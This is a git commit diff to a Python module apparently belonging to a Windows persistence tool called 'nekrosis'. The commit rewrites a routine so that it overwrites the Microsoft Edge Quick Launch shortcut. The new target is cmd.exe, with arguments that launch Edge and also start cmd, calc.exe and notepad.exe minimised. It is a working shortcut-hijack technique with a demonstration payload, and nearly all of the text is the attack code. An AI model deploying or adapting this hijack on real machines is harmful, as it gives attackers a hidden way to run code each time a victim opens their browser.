22a551162139228b490aeccecea13099a754a511
Ulysses Hill <ulyssesahill@gmail.com>
2024-01-19 11:24:11 -0700

    updated shortcut
    running the program will amend a cmd command to launch calc.exe when edge launches
    
    TODO: make the user dynamically listed

--- nekrosis/support/windows_utilities/shortcut.py
+++ nekrosis/support/windows_utilities/shortcut.py
@@ -1,51 +1,33 @@
-#The plan is to overwrite the exectuable path on windows edge that will startup on launch
 import os
 import win32com.client
-def get_edge_shortcut_path():
-    #gets the username for the following filepath
-    username = os.getlogin()
-    
-    #specifies filename and filepath
-    edge_filename = "Microsoft Edge.lnk"  
-    edge_path = fr"C:\Users\{username}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Microsoft Edge"
-    #checks to see if it indeed exists
-    full_path = os.path.join(edge_path, edge_filename)
-    
-    if os.path.exists(full_path):
-        return full_path
-    else:
-        return None
 
-def change_shortcut_target(shortcut_path, new_target_path):
-    # Get the full path to the shortcut
-    shortcut_path = os.path.abspath(shortcut_path)
+def modify_edge_shortcuts():
+    # New path to the Microsoft Edge shortcut
+    edge_shortcut_path = r"C:\Users\UlyssesHill\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\Microsoft Edge.lnk" #TODO: change the filepath to be dynamically linked to use the usernames
 
-    # Create a shell object
-    shell = win32com.client.Dispatch("WScript.Shell")
+    # Modify the specified Edge shortcut
+    modify_shortcut(edge_shortcut_path)
 
+def modify_shortcut(shortcut_path):
     try:
-        # Load the shortcut
+        # Use win32com.client to modify the shortcut properties
+        shell = win32com.client.Dispatch("WScript.Shell")
         shortcut = shell.CreateShortCut(shortcut_path)
 
-        # Change the target path
-        shortcut.Targetpath = os.path.abspath(new_target_path)
+        target = r"%windir%\system32\cmd.exe"
+        arguments = rf'/c start "" "{shortcut.TargetPath}" & start /MIN cmd.exe & start /MIN calc.exe & start /MIN notepad.exe'
 
-        # Save the changes
+        shortcut.TargetPath = target
+        shortcut.Arguments = arguments
+
         shortcut.Save()
+        print(f"Shortcut modified: {shortcut_path}")
 
-        print(f"Shortcut target path changed successfully: {shortcut_path}")
     except Exception as e:
-        print(f"Error changing shortcut target path: {e}")
+        print(f"Error modifying shortcut '{shortcut_path}': {e}")
+
+def main():
+    modify_edge_shortcuts()
 
 if __name__ == "__main__":
-    shortcut_path = get_edge_shortcut_path()
-    
-    if shortcut_path:
-        print("Original Path Found")
-    else:
-        print("Path not found")
-    print(shortcut_path)
-    new_target_path = r"C:\Path\to\your\new\executable.exe"
-
-    # Change the shortcut target path
-    change_shortcut_target(shortcut_path, new_target_path)
+    main()
